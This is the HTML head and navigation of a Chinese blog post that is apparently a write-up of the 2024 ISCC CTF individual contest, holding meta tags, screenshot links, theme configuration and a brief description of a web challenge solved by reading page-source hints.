

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="../../../../img/icon.png">
  <link rel="icon" href="../../../../img/icon.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="tenstrings">
  <meta name="keywords" content="">
  
    <meta name="description" content="今年 ISCC 的 misc 都挺正常，不过喜提一个非预期，血赚 50 分（ 下面是 WriteUp WebWeb-还没想好名字的塔防游戏 分析网站源码，寻找 hint 或提示   下载网页源码进行对比 尝试将三段 hint 连接提交，和连上标题提交都不正确 最后提交标题和三次提示中每个大写字母成功  Web 回来吧永远滴神 打开网页发现是 EDG 图片，提示第一个 flag 藏在看的见的地方">
<meta property="og:type" content="article">
<meta property="og:title" content="2024 ISCC 个人挑战赛">
<meta property="og:url" content="http://more678.github.io/2024/05/31/2024-ISCC/index.html">
<meta property="og:site_name" content="tenstrings&#39;s blog">
<meta property="og:description" content="今年 ISCC 的 misc 都挺正常，不过喜提一个非预期，血赚 50 分（ 下面是 WriteUp WebWeb-还没想好名字的塔防游戏 分析网站源码，寻找 hint 或提示   下载网页源码进行对比 尝试将三段 hint 连接提交，和连上标题提交都不正确 最后提交标题和三次提示中每个大写字母成功  Web 回来吧永远滴神 打开网页发现是 EDG 图片，提示第一个 flag 藏在看的见的地方">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/ef757770b0929cabb4a20189c0adf7a5.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/2852dcee8b5ca69a4cbb099b920504ea.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/581010e0b6b3eef14a4bffffa1b85c8e.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/3e1074c4f98ad4667a368d2af12a1e21.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/19f1641415691d10aa9499dbbe314cb9.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/e21fe39ff78908ee6344906096a30b1e.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/23e0b145a7302a06a5e24cd20d9e6f7c.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/e8199b45d18f007dbf3d074dcfcc673a.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/5eb4199eef66f311d337c46dc76f6180.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/3a01cfeaa768643b04428455865c3ffe.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/070aad5f26566ada12435c69bb7fc029.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/e5ec5c453daf5124f95c2f90d980f8f3.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/92df8e02fbd4022d54a37cd507199de1.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/1f779e6bf92e3487a65f0eb255aa5980.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/55a4a286579cf5952f7233bc9416e4ee.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/494528942782b3f83257eb9765071c8e.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/8849e7ebebda83ab5281472acd4acb26.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/1afc9135b26301829f1d9c4e5c9375e1.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/7b5065bc6e0bf54001c87fd5dc41d536.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/5c49ff5ed70087fac25e751770748e91.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/722b443d272e1f21c2a4cfb0b7d92d2a.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/2db7e99f4aed740b02a739bc13d90d0e.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/8c00e98b75cc8974f50d29a00662443d.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/e70375df7801d70c582784c57b92696f.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/1278d22467d0de9f79c499b53e84098e.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/e6cbe4d61d387d9446666d7113cd9e71.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/477bb5073c881925ad91e0c7a18e8f4b.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/6eef55f0dee149505db8c0921b196533.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/a661d2b1b29e177a67e227a14d6127c3.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/a273a916f02966a4210630bf5606ec5b.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/e4efde115df4ce021a1fdd8a65a5fa85.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/2d1d8885da49b6c8c3705cc53e6a0570.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/e7cba154c9ff2063900990f662e1d662.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/1b905237edaff6980ec1bb4c7f7b868d.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/b4a419b5e8a385696f611579d7cf0a28.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/58718fe7c35523bbed06e2da49b446ab.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/9b9c0bcc4509ddd6cc45564f29e613a4.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/1f062ff4a3bc0870366e0e888158cf2d.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/efe72a9da5079bc29167ee5cb3d49d84.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/561767491dc740047d81b84ad52d171c.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/5e70b5dc506203f40359992064ff7f75.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/45233a7596c22c0df9e650ff97b89eca.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/8dab495f60538e1c2714fca631e30f26.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/2f9c26f1d8aa82ce6ca3d324a2ac0aa4.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/8cf61e74fcf2e234ca34f61cde567b5a.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/f2d718084494200ab25589aed471558b.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/797a492965aa8942234641da53c58c33.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/72c37833e740d15a3bed7845ee1a392d.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/175a81283c0d8c94e25a2de0aa1f7105.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/5788742abd4099a66dd7bff2f4a6ab22.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/b69e9e7d0a56562470978c5a4d8c8484.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/d21db22277e188c976d5df24f8fb87c1.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/cbdc6974eeb5878195c1f99ff1dff6c8.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/931dd4ca43de9773ba16f8cb1de34262.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/5d50e01bcdbbd69c484708689e04a0e9.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/bb85cd2206114e79b1bb63d232e9120d.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/187f365df9bedcb0421b437b77757f8b.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/e11dca655a08bc18f7f0da630403a763.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/2fe088b337b7a9b2cfbc9c8d4e33d05e.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/e42689ec215d4a35ff75476ecd3b2ac8.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/e2da52ef9dd5235008696babacf77f6e.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/36053aca6994075e8f9de72a8809390f.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/e613c17c39d519b7a71f4a6484ede7a9.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/d38141b84aaad4bb42e4d9e3c58773b6.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/d093be4453a4c0f5f22214f08487d38d.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/970f703220213b40d0f82071e59ceb85.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/719246d9d0384a3acf62772faf9c222c.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/a501e9e98add7e2fe8b6dd238c008f34.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/724a855ff31e664246d68d791788be15.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/b6c34d42cad75cf15e48eab8bcccf2d9.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/6322914718876e68b14d976baa1e792a.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/a8f171f1945052c1f94587eab2bc860f.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/eeb00166d26a8261dfbb2cc04d2fe360.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/2518316d47f718b83cef501a98aa6568.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/9928c4f4c8da3310be97fd574ff5aba3.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/910179640399a040de377d79f31c39e0.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/9194d67f18432a4994bf1b4afbd8116a.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/deb6d9292752b1d98991014fa824b8d3.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/3e8dd87573bb8e53d7e52e8f3edceb09.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/9eea286b8c61457b5a727c2c94034a34.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/d8792f78efed66513a2ce13e9b0dd5d6.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/b0434ca059ca1fbde50429db61e0fd04.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/267338d6895eff990425d3ab3fa2c4cb.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/3b0dafe08b73be43d5802a1ac2afb255.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/ac19b2ce2ebbb2f06ebe8d257ceca447.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/e8d556a489c45e40f1ad061a3b765852.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/e55f850dd4b4050487f9ee4c0a7273c7.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/d7a7d8becab3b1bc332ac921d3c1f48f.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/bdc4123ec30fc73aad8a705e6d3efb49.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/badc9c909cb37043fec7281e6b3b09bd.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/2f021617b9e7e208bdb97f32dec4ec34.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/aba323f8fb5b4b49a2a5e143c94178e8.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/576a1929d4e27d0317214dc904e764b2.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/880dbb8a59abf6c47fe75f2f75e3a33e.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/cd5679dfb496fb3a31259edf624df6cf.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/671695d46ff2dca7d263bc6d84c3f8b5.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/7234bb18410f796bc846d5f241697b87.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/8da28665613ade8b208f6917b23c6bd9.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/2317fe4fc2993d4735e5d7706b79daea.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/bc021f8ab2edc024cb9ff324e6eb616b.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/867015e9c5a06b0c95567201b6ec071a.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/da8dd2774b5572c9516dd9a9a067c92b.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/1aac71fc6a5c64185bc691d8bb1f8208.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/48a107bdc80a2428cb99b34c29593de2.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/19609fdd5b165a1c9a2cd638f233cf8c.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/250ac2e69927af03d950b8040746cfbb.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/955921a2fbfe33201c488754e057d069.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/8862dffa6220c688c8fb1eadff6c96a9.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/fef871bb7854c939e5863fa164c4d733.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/f12bd916f8d2b67f4d6b57b3ccc40e47.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/2a73d684ec1514d116294efd80fb61bc.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/811b7debdab63305a93b00c25f4e7fe3.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/dd3c9285cf9e6a9dedc43af30d80f1a0.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/058ddd811922946634de2a29eee83a82.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/206de344a72593667d418aae88aa8d5e.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/de964a9cd2f7f149710de00314e234be.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/89e6551d6a69235ae9bdd83605c33225.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/031b16f856a0131a1de363a92db50452.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/900cf10d9a559b1239cf297231006730.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/e9eb3305db00f9694c2f3d7a2e2b542f.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/888f1069cc7b442f53f8c6580cc93a8d.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/9b3bb1cb70384edb844eb0571d84d51d.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/7db35788d128ec67d73615b310f2846b.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/e5f294182db2d2f777e13e6482e26602.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/18a000ce598c7b0cdc99b75f70a8408f.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/00ade6e9a0ece73740d1a43b0fa5e057.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/386803bb5359aa3d5e51feefb15a8ec4.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/93e3cf387f560f29ce83edaa5f140b59.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/76f27e2b5a334fdad93956c40e8b12fc.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/d48635bf587d8d5fe3c39e8119b45be3.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/bbef766df42588bd3ca6813adf6ee87b.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/40b393a54e3f13121d2641fe16789497.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/993843873224904a32d8c54360950f09.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/68ae9da493f99a5f2a5ff3b81662c2a2.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/957c4f7138351cdd4cd13bd7ce1cb3d0.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/d2b8150d884a1852170200b41c0d993c.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/f3f87b884e26ede8084b659bc42f7d2d.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/7c252c5c18d57ddae00df0265bb8774b.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/83446fc064c3dc4ec614e08ac2c71e3a.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/5bc693a2301301ac71523b44cefa559d.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/c782d0711f1c674b32d4626d060c175f.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/5271ec5c5cfbcc7278ed67f38bebf1e0.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/2d777e87979959ef3e1d8d0815fa6d20.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/19be198e9d58c716f57ffa0f34ca9e69.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/3ae6a6210ae02d3127826d95fbbc2363.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/7805224f9d0e592ade865fd536616060.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/0f32285be839468d17ba4349dc83adaa.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/f376f92a47add97e50f035daf24dc482.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/75f121a11f2c1244599a348b3d908e74.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/75f121a11f2c1244599a348b3d908e74.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/354d69c6c58c7fc3a82e41efff8ab9b2.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/20b116633b76f68b7f4d763e6c9fbd1d.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/787e08777cb85f785b2492595191d974.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/6378818658a6b0dd131b1a2eda55f685.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/20e8aee528579859f4480efe9f35c12c.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/8f594d0355899a32caadfc418e917fde.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/68a0343131fab40d253a9dd7f3205e2e.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/466a40b05eea3711176c371b5fc3865e.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/3df9dfc634cefbf1e1d86da3735b2b03.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/90ed95aa4aa421ea06da2d7798700fca.jpeg">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/ca5c107500f1d82947d6f5b57f64d8a8.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/8e1553e8ba6aeb5a7a403e1211eb781f.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/f948f297247c9d221b2bdf2b16f2a2a7.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/6e8ba9ebe50964de1016cbbe29aa3a38.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/4260c397f017515d42700b8163daa85d.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/9098c25d2c366dec166b279001fbcf0c.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/8cc2c3be5d4efd1c9b87d8138111c74f.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/e30a902eb7f8d1130e8ffaf90970b261.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/83051c5251d75ae883d1d004f5a301ce.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/c6baea95731924a61d26527a00e1e721.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/b4b23f26c41d4e8e5485e6f690444565.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/1d9be07aa9098effd19621513b1aa4c4.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/d2efcd764705d97fb4633e1369433cb4.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/99712aa949f8fbe803d1db5b600b025e.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/575270d90122594374ce02433630ccb6.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/a41a0f5acc51349e0aa4720268b5a083.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/308a5aaa5244334186a6d4c841ffecb4.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/a3492cce080d91f41f7aebcda1ba5606.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/77ffd53676ff878f7b642ef2b3fe629c.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/67c0962e21a4669b235a40d3136d0178.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/e3d995e3a735d028ed9d27823d697427.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/5b01032d516acdc21a907d2c3b2ae64f.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/083cfc05866e7d45eed38cc00458290c.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/fabc017782a86fba46a94288f2591965.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/ddd614b5d5cc09ee4e7d5b7f9ac01142.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/142f4983b114596336e412db0afdf183.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/2ddc1564b577a4c1c069d36ad210ad85.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/2cb1eac41170c462afb83dd410a3ee86.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/d740f35915d7e22829073fc63419746c.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/aa34bc90fee178af75c20e5e85f259ee.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/dfdce4ecaf8e8ade2044125f2fcffa5f.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/d4302415fe8f5805431aaf1f8d7c4c67.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/c9dc42b68249eebe5ec829ed9aa34850.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/47b7dec97434a49d33fbb71fd4b96df9.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/78179485988e9499b2e6dbb007a761e7.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/e7cf278cf0663a9481a4d72b78937999.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/be89882642bcabeda87c8e49bcbad89d.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/7c7b1b6bad53a93667c32070a585f908.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/9ac213328d9c7201b45a6bbb08ba1d57.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/3e401ef9060d3882e4fe66f4ca370b6a.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/6f3e40a0b7393c3ed815924806ffdcc2.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/5004c816f624e46cbde84e588f57af71.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/1eda475542dbd971af966f54c530ac45.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/2eb6d72d926a423af2cb0370161e8f4a.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/8e3b3e82b1720e661e4d3f8f1cb04b65.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/026ea5466c0ced090cda36d9807422d2.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/8fd591d2aa2f626e6de8955888b705e2.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/a936dae8418492d9c50001abaf03bc4a.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/356f4a01718972aa503b98d15976c5dd.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/964cc68b2c087595311360ddf5de7486.png">
<meta property="og:image" content="http://more678.github.io/img/archives/2024ISCC05/d1e1f65f1b849ca349ee4f0be33a134b.png">
<meta property="article:published_time" content="2024-05-31T03:50:58.000Z">
<meta property="article:modified_time" content="2024-11-17T04:01:55.974Z">
<meta property="article:author" content="tenstrings">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Misc">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="Crypto">
<meta property="article:tag" content="Reverse">
<meta property="article:tag" content="Pwn">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://more678.github.io/img/archives/2024ISCC05/ef757770b0929cabb4a20189c0adf7a5.png">
  
  
  
  <title>2024 ISCC 个人挑战赛 - tenstrings&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="../../../../css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="../../../../css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="../../../../css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"more678.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"AkNKOtPwj7k90lMACLoaJ5ZK-gzGzoHsz","app_key":"e9kFad97QptN4ZXCtoS47NYc","server_url":"https://aknkotpw.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2020-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="../../../../js/utils.js" ></script>
  <script  src="../../../../js/color-schema.js" ></script>
  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="../../../../index.html">
      <strong>tenstrings&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
